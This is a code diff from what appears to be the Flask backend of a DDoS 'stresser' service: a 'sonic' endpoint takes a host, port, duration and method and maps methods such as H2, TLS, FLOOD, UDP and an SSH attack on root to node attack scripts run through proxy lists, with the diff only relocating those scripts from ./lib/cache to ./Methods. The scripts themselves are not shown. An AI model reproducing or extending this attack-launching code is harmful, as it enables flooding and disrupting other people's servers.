@@ -14,13 +14,13 @@ def sonic():
         return jsonify({"error": "Missing required parameters: host, time, methods"}), 400
 
     commands = {
-        'H2': f'node ./lib/cache/h2.js {host} {time} 45 12 proxy.txt',
-        'TLS': f'node ./lib/cache/tls.js {host} {time} 32 8 proxy.txt',
-        'FLOOD': f'node ./lib/cache/flood.js {host} {time} 56 12 proxy.txt',
-        'MIX': f'node ./lib/cache/mix.js {host} {time} 12 45 proxy.txt -v 3',
-        'SKIBIDI': f'node ./lib/cache/skibidi.js {host} {time}',
-        'UDP': f'node ./lib/cache/udp.js {host} {port} {time}',
-        'SSH': f'node ./lib/cache/ssh.js {host} {port} root {time}'
+        'H2': f'node ./Methods/h2.js {host} {time} 45 12 proxy.txt',
+        'TLS': f'node ./Methods/tls.js {host} {time} 32 8 proxy.txt',
+        'FLOOD': f'node ./Methods/flood.js {host} {time} 56 12 proxy.txt',
+        'MIX': f'node ./Methods/mix.js {host} {time} 12 45 proxy.txt -v 3',
+        'SKIBIDI': f'node ./Methods/skibidi.js {host} {time}',
+        'UDP': f'node ./Methods/udp.js {host} {port} {time}',
+        'SSH': f'node ./Methods/ssh.js {host} {port} root {time}'
     }
 
     command = commands.get(methods)
